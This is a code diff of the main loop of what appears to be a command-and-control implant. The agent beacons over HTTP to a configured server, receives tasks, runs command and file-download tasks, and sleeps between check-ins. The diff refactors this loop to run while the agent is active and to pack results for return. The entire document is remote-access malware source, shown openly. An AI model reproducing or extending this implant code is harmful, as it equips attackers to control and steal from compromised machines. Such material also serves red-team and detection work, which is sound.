@@ -10,7 +10,7 @@ void AgentMain()
 {
 	if ( !ApiLoad() ) return;
 
-	g_Agent  = (Agent*)MemAllocLocal(sizeof(Agent));
+	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
 	*g_Agent = Agent();
 
 	LPSTR beat         = g_Agent->BuildBeat();
@@ -28,21 +28,12 @@ void AgentMain()
 
 	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
 	*g_Connector = ConnectorHTTP();
-	g_Connector->SetConfig(
-		g_Agent->config->use_ssl,
-		(CHAR*)g_Agent->config->user_agent,
-		(CHAR*)g_Agent->config->method,
-		(CHAR*)g_Agent->config->address,
-		g_Agent->config->port,
-		(CHAR*)g_Agent->config->uri,
-		HttpHeaders
-	);
+	g_Connector->SetConfig( g_Agent->config->use_ssl, (CHAR*)g_Agent->config->user_agent, (CHAR*)g_Agent->config->method, (CHAR*)g_Agent->config->address, g_Agent->config->port, (CHAR*)g_Agent->config->uri, HttpHeaders );
 
 	PBYTE sendData     = NULL;
 	ULONG sendDataSize = 0;
 
-	while (true)
-	{
+	while ( g_Agent->active ) {
 		ULONG recvDataSize = 0;
 		BYTE* recvData     = g_Connector->SendData( sendData, sendDataSize, &recvDataSize);
 
@@ -51,15 +42,19 @@ void AgentMain()
 			sendDataSize = 0;
 		}
 
-		if (recvDataSize > 4) {
-			Packer* data = ProcessCommand(recvData, recvDataSize);
-			if (data && data->GetDataSize() > 4) {
+		Packer* packerData = (Packer*) MemAllocLocal(sizeof(Packer));
+		*packerData = Packer();
+		packerData->Pack32(0);
+		
+		g_Agent->commander->ProcessCommandTasks(recvData, recvDataSize, packerData);
+		g_Agent->downloader->ProcessDownloadTasks(packerData);
 
-				sendDataSize = data->GetDataSize();
-				sendData = data->GetData();
-
-				continue;
-			}
+		if (packerData && packerData->GetDataSize() > 4) 
+		{
+			packerData->Set32(0, packerData->GetDataSize());
+			sendDataSize = packerData->GetDataSize();
+			sendData = packerData->GetData();
+			continue;
 		}
 
 		Sleep( g_Agent->config->sleep_delay * 1000);
